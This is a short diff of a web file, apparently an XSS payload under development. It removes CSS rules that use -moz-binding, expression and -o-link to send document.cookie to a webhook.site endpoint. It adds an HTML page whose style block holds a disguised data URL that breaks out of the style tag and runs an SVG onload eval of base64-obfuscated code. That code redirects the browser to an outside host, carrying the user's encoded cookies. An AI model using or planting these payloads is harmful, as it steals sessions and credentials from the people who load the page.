@@ -1,5 +1,14 @@
-h1 {
--moz-binding:url('https://webhook.site/638b8327-c8fb-43fc-b10a-cbccd2749c6a?xss='+document.cookie);
-a:expression(document.location='https://webhook.site/638b8327-c8fb-43fc-b10a-cbccd2749c6a?xss='+document.cookie);
--o-link:'javascript:document.location='https://webhook.site/638b8327-c8fb-43fc-b10a-cbccd2749c6a?xss='+document.cookie';-o-link-source:current
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+div  {
+    background-image: url("data:image/jpg;base64,<\/style><svg/onload=eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly9mZmZjNDgxZS5iem4ucHcvP2tlaz0nK2J0b2EoZG9jdW1lbnQuY29va2llKQ=='))>");
+    background-color: #cccccc;
 }
+</style>
+</head>
+  <body>
+    <div>lol</div>
+  </body>
+</html>
